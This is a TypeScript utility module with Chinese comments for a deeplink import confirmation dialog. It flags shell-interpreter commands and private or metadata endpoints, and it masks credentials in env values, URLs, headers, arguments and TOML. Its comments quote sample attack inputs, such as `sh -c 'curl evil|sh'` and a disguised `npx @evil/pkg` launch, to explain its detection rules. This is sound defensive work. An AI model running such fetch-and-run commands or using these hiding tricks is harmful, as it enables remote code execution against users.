// deeplink 导入确认框的取值呈现工具。
//
// 这里的所有判定**只用于 UI 提示，不参与任何拦截决策**。深链接携带的自定义
// endpoint 与 env 是第三方供应商的正常配置能力（`http://localhost:11434` 就是
// Ollama / LM Studio 的常规用法），拦下来会打断合法场景。真正的缺口是用户在
// 点「导入」时看不到自己在同意什么——所以补的是可见性，不是黑名单。

//
// env 键不在这里判定：按工具的允许清单 / 拒绝清单由后端
// `deeplink/env_allowlist.rs` 裁决并真正拦截，确认框只展示
// `preview_deeplink_import` 返回的结论（MH-4）。

export type RiskKind = "envHijack" | "privateEndpoint" | "shellCommand";

/** 会被 shell 解释成"执行下面这段字符串"的调用形态。 */
const SHELL_INTERPRETERS = new Set([
  "sh",
  "bash",
  "zsh",
  "dash",
  "ksh",
  "fish",
  "csh",
  "tcsh",
  "cmd",
  "cmd.exe",
  "powershell",
  "powershell.exe",
  "pwsh",
  "pwsh.exe",
]);

/**
 * 「下一个参数是要执行的命令串」这一族开关。
 *
 * 不能只比 `-c`：POSIX shell 允许把单字母开关并成一串（`bash -lc`、`sh -eco pipefail`
 * 之类），Windows 侧则是 `/c` `/k` 且大小写不敏感，PowerShell 还有 `-Command`
 * 的各种缩写。这里按形态判定而不是枚举字面量。
 */
function isInlineCommandFlag(arg: string): boolean {
  const lower = arg.toLowerCase();

  // cmd.exe：/c、/k，可带后缀（/c:）
  if (/^\/[ck]\b/.test(lower)) return true;

  // PowerShell：-Command / -c 及其任意合法缩写（-comm、-comma…）
  if (/^-c(o(m(m(a(n(d)?)?)?)?)?)?$/.test(lower)) return true;
  if (lower === "-encodedcommand" || lower === "-e" || lower === "-ec") {
    return true;
  }

  // POSIX shell：单横线 + 一串短开关，其中含 c（-c、-lc、-ec、-eco…）
  if (/^-[a-z]*c[a-z]*$/.test(lower)) return true;

  return false;
}

/**
 * 判定是否为环回 / 私网 / 云元数据地址。
 *
 * 只做**字面量**匹配，不做 DNS 解析：解析会引入超时，而且解析结果与客户端稍后
 * 实际连接时的结果可以不同（DNS rebinding），拿它当防线是虚假的确定性。作为
 * "这个地址看着像内网，你确认吗"的提示，字面量匹配已经够用。
 */
/**
 * 取出主机的 IPv4 四元组，兼容 IPv4-mapped IPv6。
 *
 * `new URL("http://[::ffff:127.0.0.1]/")` 会把主机**归一成十六进制**
 * `[::ffff:7f00:1]`，点分形式在这一步就消失了，只按 `\d+\.\d+\.\d+\.\d+`
 * 匹配会整类漏掉——`[::ffff:169.254.169.254]` 同理会绕过内网判定。
 */
function extractIpv4Octets(bare: string): [number, number] | null {
  const dotted = bare.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (dotted) return [Number(dotted[1]), Number(dotted[2])];

  // ::ffff:7f00:1 → 0x7f00 0x0001 → 127.0.0.1
  const mapped = bare.match(/^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
  if (mapped) {
    const high = parseInt(mapped[1], 16);
    return [(high >> 8) & 0xff, high & 0xff];
  }

  // 少数实现保留点分尾巴：::ffff:127.0.0.1
  const mappedDotted = bare.match(
    /^::ffff:(\d{1,3})\.(\d{1,3})\.\d{1,3}\.\d{1,3}$/,
  );
  if (mappedDotted) {
    return [Number(mappedDotted[1]), Number(mappedDotted[2])];
  }

  return null;
}

export function classifyEndpoint(rawUrl: unknown): RiskKind | null {
  if (typeof rawUrl !== "string") return null;

  let host: string;
  try {
    host = new URL(rawUrl).hostname.toLowerCase();
  } catch {
    return null;
  }

  // URL 会把 IPv6 主机保留在方括号里
  const bare =
    host.startsWith("[") && host.endsWith("]") ? host.slice(1, -1) : host;

  if (
    bare === "localhost" ||
    bare.endsWith(".localhost") ||
    bare.endsWith(".local") ||
    bare.endsWith(".internal") ||
    bare === "::1" ||
    bare === "::" ||
    bare === "0.0.0.0"
  ) {
    return "privateEndpoint";
  }

  const octets = extractIpv4Octets(bare);
  if (octets) {
    const [a, b] = octets;
    if (
      a === 127 || // 环回
      a === 10 || // RFC 1918
      a === 0 ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 169 && b === 254) // 链路本地，含 AWS/GCP 元数据 169.254.169.254
    ) {
      return "privateEndpoint";
    }
  }

  // IPv6 唯一本地地址 fc00::/7 与链路本地 fe80::/10
  if (/^f[cd][0-9a-f]{2}:/.test(bare) || /^fe[89ab][0-9a-f]:/.test(bare)) {
    return "privateEndpoint";
  }

  return null;
}

/**
 * MCP server 的 `command` + `args`。
 *
 * 单看 `command` 完全不够：真实 payload 是 `command: "sh"` 配
 * `args: ["-c", "curl evil|sh"]`，界面上只渲染 command 时它显示成无害的 `sh`。
 *
 * 两个参数都声明成 `unknown`：它们来自深链接里 base64 解码后的任意 JSON，TS 的
 * 类型标注在这个边界上不设防。写成 `string` 而实际收到对象或数字时 `.split()`
 * 会抛错，把整个确认框炸成空白——那比显示一条误导性的 `Command: sh` 更糟，因为
 * 用户连"有东西要导入"都看不到了。
 */
export function classifyCommand(
  command: unknown,
  args?: unknown,
): RiskKind | null {
  if (typeof command !== "string" || !command) return null;
  if (!Array.isArray(args)) return null;

  // 只取基名：`/bin/sh` 与 `sh` 是同一回事
  const base = command.split(/[/\\]/).pop()?.toLowerCase() ?? "";
  if (SHELL_INTERPRETERS.has(base)) {
    return args.some(
      (arg) => typeof arg === "string" && isInlineCommandFlag(arg),
    )
      ? "shellCommand"
      : null;
  }
  const inlineCode = INLINE_CODE_FLAGS[commandName(command)];
  return inlineCode &&
    args.some((arg) => typeof arg === "string" && inlineCode.test(arg))
    ? "shellCommand"
    : null;
}

/** 去掉目录和 Windows 可执行后缀的命令名：`C:\\x\\node.exe` → `node`。 */
function commandName(command: unknown): string {
  if (typeof command !== "string") return "";
  return (command.split(/[/\\]/).pop() ?? "")
    .toLowerCase()
    .replace(/\.(exe|cmd|bat|ps1)$/, "");
}

/**
 * 解释器「运行参数里这段代码」的开关：`node -e`、`python -c`、`deno eval` 等。
 * 这段代码能读取后面任何一个参数，所以这类命令的参数一个都不遮盖。
 */
const INLINE_CODE_FLAGS: Record<string, RegExp> = {
  node: /^(-[ep]|-pe|--eval|--print)$/,
  nodejs: /^(-[ep]|-pe|--eval|--print)$/,
  bun: /^(-[ep]|--eval|--print)$/,
  deno: /^eval$/,
  python: /^-[a-zA-Z]*c$/,
  python3: /^-[a-zA-Z]*c$/,
  python2: /^-[a-zA-Z]*c$/,
  py: /^-[a-zA-Z]*c$/,
  pypy: /^-[a-zA-Z]*c$/,
  pypy3: /^-[a-zA-Z]*c$/,
  perl: /^-[a-zA-Z]*[eE]$/,
  ruby: /^-[a-zA-Z]*e$/,
  php: /^-r$/,
  osascript: /^-e$/,
  lua: /^-e$/,
  luajit: /^-e$/,
  rscript: /^-e$/,
};

/**
 * 启动器：参数里写着要运行什么（`npx 包名`、`uvx 包名`、`docker run 镜像`…）。
 * 它们把不认识的开关当布尔开关，紧跟其后的参数可能正是要运行的包，所以
 * 「凭据开关后面那一项」在这类命令里不遮盖。
 */
const LAUNCHERS = new Set([
  "npx",
  "npm",
  "pnpm",
  "pnpx",
  "yarn",
  "bunx",
  "bun",
  "uvx",
  "uv",
  "pipx",
  "deno",
  "node",
  "nodejs",
  "python",
  "python3",
  "python2",
  "py",
  "pypy",
  "pypy3",
  "docker",
  "podman",
  "nerdctl",
  "java",
  "dotnet",
  "go",
  "cargo",
  "ruby",
  "perl",
  "php",
]);

/**
 * 键名里出现这些词时，其取值按凭据处理。按词比较而不是按子串：
 * `MAX_OUTPUT_TOKENS` 是计数，`MONKEY` 也不是 key。连写的小写形式
 * （`accesstoken`）和国内云常见的 AK/SK 写法单独列出。
 */
const SENSITIVE_WORDS = new Set([
  "TOKEN",
  "KEY",
  "KEYS",
  "APIKEY",
  "APIKEYS",
  "SECRET",
  "SECRETS",
  "PASSWORD",
  "PASSWORDS",
  "PASSWD",
  "AUTHORIZATION",
  "CREDENTIAL",
  "CREDENTIALS",
  "COOKIE",
  "PAT",
  "AK",
  "SK",
  "ACCESSKEY",
  "SECRETKEY",
  "PRIVATEKEY",
  "APPSECRET",
  "CLIENTSECRET",
  "ACCESSTOKEN",
  "APITOKEN",
  "AUTHTOKEN",
]);

export function isSensitiveKey(key: string): boolean {
  return key
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .toUpperCase()
    .split(/[^A-Z0-9]+/)
    .some((word) => SENSITIVE_WORDS.has(word));
}

/** 凭据只露末 4 位，与确认框里 API Key 的「末 4 位」同一口径。 */
const MASK = "••••";

/**
 * 最短按凭据遮盖的长度。行内展示与「完整内容」都经 `shouldMask` 判断，
 * 两处不会再各遮各的。
 */
const MIN_SECRET_LENGTH = 6;

/** `OPENAI_API_KEY` 这类取值是环境变量名（如 Codex 的 `env_key`），不是凭据本身。 */
const ENV_VAR_NAME = /^[A-Z]+(?:_[A-Z]+)+$/;

/** 本机路径（如私钥文件 `C:\Users\me\.ssh\id_ed25519`）要能看清，不是凭据。 */
const LOCAL_PATH = /^(?:[A-Za-z]:[\\/]|~[\\/]|\.{1,2}[\\/])/;

/** 认证方案名不是秘密，留着更看得懂：`Bearer ••••cdef`。 */
const AUTH_SCHEME = /^(\s*(?:Bearer|Basic|Token)\s+)(\S[\s\S]*)$/i;

export function maskSecret(value: string): string {
  // One scheme word stays; the rest is masked as a whole. No recursion: a
  // value of thousands of "Basic " words must not overflow the stack.
  const scheme = AUTH_SCHEME.exec(value);
  const prefix = scheme ? scheme[1] : "";
  const text = (scheme ? scheme[2] : value).trim();
  return `${prefix}${text.length > 8 ? `${MASK}${text.slice(-4)}` : MASK}`;
}

/** 够长、不是环境变量名也不是本机路径的取值才可能是凭据；数字也算（密码、PIN）。 */
function isMaskableValue(value: unknown): value is string | number {
  if (typeof value !== "string" && typeof value !== "number") return false;
  const text = String(value).trim();
  return (
    text.length >= MIN_SECRET_LENGTH &&
    !ENV_VAR_NAME.test(text) &&
    !LOCAL_PATH.test(text)
  );
}

/** `GIT_CONFIG_KEY_0` 存的是 git 设置名，不是密钥；遮了就看不出注入了哪项设置。 */
const isExemptKey = (key: string) => /^GIT_CONFIG_KEY_\d+$/i.test(key);

/** 键名是凭据、取值像凭据时才遮盖；短值不遮，否则连「是不是空的」都看不出来。 */
export function shouldMask(key: string, value: unknown): boolean {
  return isSensitiveKey(key) && !isExemptKey(key) && isMaskableValue(value);
}

/** 请求头集合（如 `ANTHROPIC_CUSTOM_HEADERS`）：每行一个 `名称: 值`。 */
const isHeaderListKey = (key: string) =>
  key
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .toUpperCase()
    .split(/[^A-Z0-9]+/)
    .some((word) => word === "HEADERS" || word === "HEADER");

/**
 * 凭据类取值的展示脱敏（供应商与 MCP 的环境变量行共用），与「完整内容」
 * 同一套规则：凭据键名下的值、URL 里的凭据、请求头里的凭据。
 *
 * 原先是 `DeepLinkImportDialog` 内的组件闭包；MCP 确认页也要展示 env，抽出来是
 * 为了两处共用同一套规则——各写一份迟早会漂移成两种脱敏口径。
 */
export function maskValue(key: string, value: unknown): string {
  if (shouldMask(key, value)) return maskSecret(String(value));
  if (typeof value !== "string") return String(value);
  return maskLooseValue(key, value);
}

/** `Bearer sk-…` 这种写法本身就是凭据，与键名无关（如 `AUTH_HEADER`）。 */
const BEARER_VALUE = /^\s*(?:Bearer|Basic|Token)\s+\S{6,}/i;

/** 键名不是凭据时，取值里仍可能带凭据：URL、认证头写法、请求头列表。 */
function maskLooseValue(key: string, value: string): string {
  if (BEARER_VALUE.test(value)) return maskSecret(value);
  if (URL_SCHEME.test(value)) return maskUrl(value);
  return isHeaderListKey(key) ? maskHeaderLines(value) : value;
}

/*
 * 以下都按位置脱敏：只换凭据所在的那一段，其余字符原样保留。
 * 不能按「已知凭据」在全文里做替换——取值来自链接本身，链接把某个
 * 「凭据」设成和要执行的包名、主机名一样，就能把它们从确认框里藏起来。
 * 同理，凡是位置上可能是「要运行什么」的参数都不遮盖（见 `maskArgs`）。
 */

const decodePart = (text: string) => {
  try {
    return decodeURIComponent(text.replace(/\+/g, " "));
  } catch {
    return text;
  }
};

const URL_SCHEME = /^[a-z][a-z0-9+.-]*:\/\//i;

function maskLongEnough(decoded: string, raw: string): string {
  return decoded.trim().length >= MIN_SECRET_LENGTH ? maskSecret(decoded) : raw;
}

/** 这些用户名或密码只是占位，真正的令牌在另一半（GitHub 的两种写法）。 */
const USERINFO_PLACEHOLDER =
  /^(?:x-oauth-basic|x-oauth-token|x-access-token|oauth2|x-token-auth)$/i;

/**
 * URL 里的凭据：userinfo，以及查询串与片段里凭据类参数的值。
 * userinfo 按 WHATWG 的解析确认：`https://evil.example\@good.example`
 * 的主机是 evil.example，「@」前面不是用户名，不能当用户名遮掉。
 */
export function maskUrl(url: string): string {
  const scheme = URL_SCHEME.exec(url);
  if (!scheme) return url;
  let head = scheme[0];
  let rest = url.slice(head.length);
  const authorityEnd = rest.search(/[/?#\\]/);
  const authority = authorityEnd === -1 ? rest : rest.slice(0, authorityEnd);
  const at = authority.lastIndexOf("@");
  if (at !== -1 && hasUserinfo(url)) {
    const userinfo = authority.slice(0, at);
    const colon = userinfo.indexOf(":");
    const user = colon === -1 ? userinfo : userinfo.slice(0, colon);
    const pass = colon === -1 ? "" : userinfo.slice(colon + 1);
    // 只有用户名、密码为空或只是占位（`x-oauth-basic`）时，令牌在用户名里；
    // 否则用户名照常显示，遮盖密码。
    const tokenInUser = !pass || USERINFO_PLACEHOLDER.test(decodePart(pass));
    head +=
      (tokenInUser ? maskLongEnough(decodePart(user), user) : user) +
      (colon === -1
        ? ""
        : `:${tokenInUser ? pass : maskLongEnough(decodePart(pass), pass)}`) +
      "@";
    rest = rest.slice(at + 1);
  }
  return (
    head +
    rest.replace(
      /([?&#;])([^=&#;]*)=([^&#;]*)/g,
      (whole, separator: string, name: string, value: string) =>
        shouldMask(decodePart(name), decodePart(value))
          ? `${separator}${name}=${maskSecret(decodePart(value))}`
          : whole,
    )
  );
}

function hasUserinfo(url: string): boolean {
  try {
    const parsed = new URL(url);
    return parsed.username !== "" || parsed.password !== "";
  } catch {
    return false;
  }
}

/** `--api-key`、`--access-token`、`-token`：开关名本身是凭据类键名。 */
function isSecretFlag(arg: string): boolean {
  return (
    /^--?[A-Za-z0-9][\w-]*$/.test(arg) && isSensitiveKey(arg.replace(/^-+/, ""))
  );
}

const isHeaderFlag = (arg: string) => arg === "-H" || /^--?header$/i.test(arg);

/** `Authorization: Bearer x` 这样的请求头：键名是凭据时遮盖取值。 */
function maskHeader(header: string): string {
  const parts = /^(\s*([A-Za-z0-9_-]+)\s*:\s*)([\s\S]*)$/.exec(header);
  if (!parts || !shouldMask(parts[2], parts[3])) return header;
  return `${parts[1]}${maskSecret(parts[3])}`;
}

const maskHeaderLines = (text: string) =>
  text.split("\n").map(maskHeader).join("\n");

/**
 * 命令参数里的凭据：`--api-key=x` 与 `API_KEY=x` 的取值、`-H` / `--header`
 * 后面请求头的取值、URL 里的凭据，以及直接运行的程序在凭据开关后面的那一项
 * （`--api-key x`）。
 *
 * 启动器（`npx`、`uvx`、`docker`…）的「凭据开关后面那一项」不遮盖：它们把
 * 不认识的开关当布尔开关，`npx -y --auth-token @evil/pkg` 运行的正是
 * `@evil/pkg`。用 `node -e`、`sh -c` 这类方式运行一段代码时，代码能读到任何
 * 参数，所以一个都不遮盖。
 */
export function maskArgs(
  args: readonly unknown[],
  command?: unknown,
): string[] {
  const list = args.map(String);
  if (classifyCommand(command, list)) return list;
  const launcher = LAUNCHERS.has(commandName(command));
  return list.map((arg, index) => {
    const previous = index > 0 ? list[index - 1] : "";
    if (isHeaderFlag(previous)) return maskHeader(arg);
    if (
      !launcher &&
      isSecretFlag(previous) &&
      !arg.startsWith("-") &&
      isMaskableValue(arg)
    ) {
      return maskSecret(arg);
    }
    if (/^-H\S/.test(arg)) return `-H${maskHeader(arg.slice(2))}`;
    const pair = /^(-{0,2})([\w.-]+)=([\s\S]*)$/.exec(arg);
    if (pair) {
      const [, dashes, name, value] = pair;
      if (isHeaderFlag(`${dashes}${name}`)) {
        return `${dashes}${name}=${maskHeader(value)}`;
      }
      if (shouldMask(name, value)) {
        return `${dashes}${name}=${maskSecret(value)}`;
      }
      // `--env=GITHUB_TOKEN=ghp_…`: the value is itself a variable.
      const inner = /^([\w.-]+)=([\s\S]*)$/.exec(value);
      if (inner && shouldMask(inner[1], inner[2])) {
        return `${dashes}${name}=${inner[1]}=${maskSecret(inner[2])}`;
      }
      return `${dashes}${name}=${maskLooseValue(name, value)}`;
    }
    if (BEARER_VALUE.test(arg)) return maskSecret(arg);
    return URL_SCHEME.test(arg) ? maskUrl(arg) : arg;
  });
}

/** TOML 里的 `key = "value"`，也匹配内联表里的 `"Authorization" = "…"`。 */
const TOML_PAIR =
  /((?:^|[{,])[ \t]*)((?:"[^"\n]*"|'[^'\n]*'|[\w-]+)(?:[ \t]*\.[ \t]*(?:"[^"\n]*"|'[^'\n]*'|[\w-]+))*)([ \t]*=[ \t]*)("(?:[^"\\\n]|\\.)*"|'[^'\n]*')/gm;

/** config.toml 文本（Codex、Grok Build）里凭据类键的取值，以及 URL 里的凭据。 */
export function maskToml(text: string): string {
  return text.replace(
    TOML_PAIR,
    (whole, lead: string, path: string, equals: string, literal: string) => {
      const key = (path.split(".").pop() ?? "")
        .trim()
        .replace(/^["']|["']$/g, "");
      const value = literal.slice(1, -1);
      const masked = shouldMask(key, value)
        ? maskSecret(value)
        : URL_SCHEME.test(value)
          ? maskUrl(value)
          : value;
      if (masked === value) return whole;
      const quote = literal[0];
      return `${lead}${path}${equals}${quote}${masked}${quote}`;
    },
  );
}

/**
 * 「将保存的完整内容」（后端 JSON 预览解析后的值）里的凭据：凭据类键名下的
 * 取值（含其下整个对象或数组）、URL 与请求头里的凭据、命令参数里的凭据
 * （按同一对象里的 `command` 判断，见 `maskArgs`），以及 config.toml 文本。
 * 返回新值，不改动传入的值。
 */
export function maskStoredValue(
  value: unknown,
  key = "",
  depth = 0,
  underSecret = false,
): unknown {
  if (depth > 32) return value;
  if (typeof value === "string" || typeof value === "number") {
    if (underSecret ? isMaskableValue(value) : shouldMask(key, value)) {
      return maskSecret(String(value));
    }
    if (typeof value === "number") return value;
    if (key === "config" && value.includes("\n")) return maskToml(value);
    return maskLooseValue(key, value);
  }
  const secret = underSecret || (isSensitiveKey(key) && !isExemptKey(key));
  if (Array.isArray(value)) {
    return value.map((item) => maskStoredValue(item, key, depth + 1, secret));
  }
  if (value && typeof value === "object") {
    const record = value as Record<string, unknown>;
    return Object.fromEntries(
      Object.entries(record).map(([child, item]) => [
        child,
        child === "args" && Array.isArray(item) && !secret
          ? maskArgs(item, record.command)
          : maskStoredValue(item, child, depth + 1, secret),
      ]),
    );
  }
  return value;
}

/** 像凭据的值：至少 8 位，只含令牌常用字符，没有空白、引号、括号或冒号。 */
const CREDENTIAL_SHAPE = /^[\w.~+/=-]{8,}$/;

/** 以「.字母」结尾的是主机名（`api2.evil.example`），不是令牌。 */
const HOSTNAME_TAIL = /\.[a-z]{2,24}$/;

const isWordChar = (char: string | undefined) =>
  char !== undefined && /[\w$]/.test(char);

/**
 * 用量脚本是不透明的代码，只能按链接给出的凭据替换文本。为免链接借「凭据」
 * 藏起脚本里的其他内容，只替换像凭据（同时有字母和数字、不是主机名）的值，
 * 而且只在完整的词上替换。
 */
export function maskScriptSecrets(
  code: string,
  secrets: Iterable<string | undefined>,
): string {
  const values = [
    ...new Set([...secrets].map((secret) => (secret ?? "").trim())),
  ]
    .filter(
      (value) =>
        CREDENTIAL_SHAPE.test(value) &&
        /[A-Za-z]/.test(value) &&
        /\d/.test(value) &&
        !HOSTNAME_TAIL.test(value),
    )
    // 长的先换：一个凭据可能包含另一个。
    .sort((a, b) => b.length - a.length);
  return values.reduce((text, value) => {
    let result = "";
    let from = 0;
    for (
      let at = text.indexOf(value);
      at !== -1;
      at = text.indexOf(value, at + value.length)
    ) {
      if (isWordChar(text[at - 1]) || isWordChar(text[at + value.length])) {
        continue;
      }
      result += `${text.slice(from, at)}${maskSecret(value)}`;
      from = at + value.length;
    }
    return result + text.slice(from);
  }, code);
}

/** 风险种类 → i18n key。 */
export function riskI18nKey(kind: RiskKind): string {
  return `deeplink.risk.${kind}`;
}
